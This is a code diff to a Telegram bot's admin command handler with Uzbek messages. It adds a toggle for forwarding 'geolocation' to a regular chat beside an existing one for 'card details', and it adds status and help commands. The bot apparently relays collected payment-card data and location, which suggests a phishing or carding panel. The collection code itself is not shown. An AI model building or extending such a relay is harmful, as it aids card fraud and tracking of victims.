@@ -38,7 +38,7 @@ async function handleUpdate(update) {
     if (!update.message || !update.message.text) return;
 
     const chatId = update.message.chat.id.toString();
-    const text = update.message.text.trim();
+    const text = update.message.text.trim().toLowerCase();
 
     // Only respond in admin chat
     if (chatId !== config.ADMIN_TELEGRAM_CHAT_ID) return;
@@ -57,11 +57,39 @@ async function handleUpdate(update) {
         console.log(`Card details to regular chat: ${state.sendCardToRegularChat}`);
     }
 
+    if (text.startsWith('/activegeodetails')) {
+        const state = stateService.get();
+        state.sendGeoToRegularChat = !state.sendGeoToRegularChat;
+        stateService.update(state);
+
+        const statusText = state.sendGeoToRegularChat
+            ? '✅ Geolokaciya oddiy chatga yuboriladi'
+            : '❌ Geolokaciya oddiy chatga yuborilmaydi';
+
+        await telegram.sendMessage(chatId, statusText);
+        console.log(`Geo details to regular chat: ${state.sendGeoToRegularChat}`);
+    }
+
     if (text === '/status') {
         const state = stateService.get();
         await telegram.sendMessage(chatId,
             `📊 <b>Server Status</b>\n\n` +
-            `💳 Karta → oddiy chat: ${state.sendCardToRegularChat ? '✅' : '❌'}`
+            `💳 Karta → oddiy chat: ${state.sendCardToRegularChat ? '✅' : '❌'}\n` +
+            `📍 Geo → oddiy chat: ${state.sendGeoToRegularChat ? '✅' : '❌'}`
+        );
+    }
+
+    if (text === '/help' || text === 'help') {
+        await telegram.sendMessage(chatId,
+            `📋 <b>Bot Buyruqlari</b>
+
+/activecarddetails — Karta ma'lumotlarini oddiy chatga yuborish/o'chirish
+
+/activegeodetails — Geolokaciyani oddiy chatga yuborish/o'chirish
+
+/status — Hozirgi sozlamalarni ko'rish
+
+/help — Ushbu xabarni ko'rish`
         );
     }
 }
